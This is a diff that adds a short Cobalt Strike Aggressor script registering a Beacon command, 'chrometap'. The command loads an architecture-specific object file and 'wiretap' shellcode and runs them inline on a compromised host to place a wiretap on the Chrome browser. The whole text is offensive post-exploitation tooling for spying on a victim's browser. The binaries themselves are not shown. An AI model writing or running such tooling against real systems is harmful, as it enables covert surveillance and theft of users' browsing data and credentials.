@@ -1,0 +1,28 @@
+alias chrometap {
+    $arch = binfo($1, "barch");
+
+    if ($arch eq "x64") {
+        $handle = openf(script_resource("bin/chrometap.x64.o"));
+        $shchandle = openf(script_resource("bin/wiretap.x64.bin"));
+    }
+    else {
+        $handle = openf(script_resource("bin/chrometap.x86.o"));
+        $shchandle = openf(script_resource("bin/wiretap.x86.bin"));
+    }
+    
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    $shcdata   = readb($shchandle, -1);
+    closef($shchandle);
+
+    $args = bof_pack($1, "ib", strlen($shcdata), $shcdata);
+
+    btask($1, "Placing wiretap on chrome")
+
+    beacon_inline_execute($1, $data, "go", $args);
+    
+    return;
+}
+
+beacon_command_register("chrometap", "Put a wiretap on chrome");
